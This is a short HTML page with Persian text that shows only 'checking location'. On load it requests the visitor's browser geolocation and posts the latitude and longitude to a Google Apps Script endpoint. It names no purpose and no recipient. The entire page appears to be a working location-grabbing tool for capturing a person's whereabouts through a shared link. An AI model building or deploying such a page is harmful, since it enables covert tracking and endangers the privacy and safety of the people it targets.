<!DOCTYPE html>
<html>
<head>
  <title>در حال بررسی موقعیت...</title>
  <script>
    function sendLocation(position) {
      var data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude
      };

      fetch("https://script.google.com/macros/s/AKfycbzds7uj0cA6EUBpyXpsvu399RxInqIuV0GG9enarElR771bs-4Oy7PFaYsxrpqYkKPpRg/exec", {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        }
      })
      .then(res => document.body.innerHTML = "<h2>موقعیت دریافت شد.</h2>")
      .catch(err => document.body.innerHTML = "<h2>خطا در ارسال موقعیت.</h2>");
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, () => {
          document.body.innerHTML = "<h2>اجازه مکان‌یابی رد شد.</h2>";
        });
      } else {
        document.body.innerHTML = "<h2>مرورگر مکان‌یابی را پشتیبانی نمی‌کند.</h2>";
      }
    }
  </script>
</head>
<body onload="requestLocation()">
  <h2>در حال دریافت موقعیت...</h2>
</body>
</html>